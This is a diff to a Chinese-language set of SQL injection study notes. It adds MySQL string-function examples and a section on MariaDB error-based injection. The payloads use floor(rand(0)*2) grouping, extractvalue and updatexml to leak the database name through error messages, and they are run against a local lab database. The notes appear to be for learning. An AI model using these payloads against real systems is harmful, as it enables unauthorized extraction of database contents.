@@ -1,5 +1,7 @@
 ## mysql
 
+### 基础
+
 - 注释
     - 单行注释
 
@@ -82,6 +84,12 @@
     +-----------------------------------------------------+
     | 31302E312E32                                        |
     +-----------------------------------------------------+
+
+	+----------------------------+
+	| substr('abc' from 1 for 2) |
+	+----------------------------+
+	| ab                         |
+	+----------------------------+
     ```
 
     -  进制转换
@@ -93,6 +101,63 @@
     |                   54083003166258 |
     +----------------------------------+
     ```
+
+	- ascii
+
+	```sql
+	+-----------------------------+
+	| ascii(substr('abc' from 3)) |
+	+-----------------------------+
+	|                          99 |
+	+-----------------------------+
+	```
+
+	- 多行合并
+
+	```sql
+	MariaDB [sec]> select group_concat(username) from admin;
+	+------------------------+
+	| group_concat(username) |
+	+------------------------+
+	| admin,tom              |
+	+------------------------+
+	```
+
+### 报错注入（mariaDB中可用的）
+
+- floor(rand(0)*2)
+
+	```sql
+	MariaDB [sec]> select count(*) ,concat(DATABASE(),floor(rand(0)*2))x from information_schema.tables group by x;
+	ERROR 1062 (23000): Duplicate entry 'sec1' for key 'group_key'
+
+	MariaDB [sec]> select * from admin where 0='1' or  (select 1 from(select count(*), concat(DATABASE(), floor(rand(0)*2)) x from information_schema.tables group by x)a);
+	ERROR 1062 (23000): Duplicate entry 'sec1' for key 'group_key'
+	```
+
+- extractvalue()
+
+	```sql
+	MariaDB [sec]> select extractvalue(1,'~aaa');
+	ERROR 1105 (HY000): XPATH syntax error: '~aaa'
+	MariaDB [sec]> select extractvalue(1,'<aaa');
+	ERROR 1105 (HY000): XPATH syntax error: '<aaa'
+	MariaDB [sec]> select extractvalue(1,'>aaa');
+	ERROR 1105 (HY000): XPATH syntax error: '>aaa'
+
+	MariaDB [sec]> select * from admin where 0='1'or (select extractvalue(1, concat('~', DATABASE())));
+	ERROR 1105 (HY000): XPATH syntax error: '~sec'
+	```
+
+- updatexml()
+
+	```sql
+	MariaDB [sec]> select updatexml(1,'~aaa', 1);    # 同 extractvalue 类似
+	ERROR 1105 (HY000): XPATH syntax error: '~aaa'
+
+	MariaDB [sec]> select * from admin where 0='1'or (select updatexml(1, concat('~', DATABASE()), 1));
+	ERROR 1105 (HY000): XPATH syntax error: '~sec'
+	```
 
 ## oracle
 
@@ -205,5 +270,7 @@
 ## 参考
 
 > [少年，这是我特意为你酿制的Oracle 注入，干了吧！](https://bbs.ichunqiu.com/thread-26734-1-1.html)
->
+> [十种MySQL报错注入](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)
+
+
 
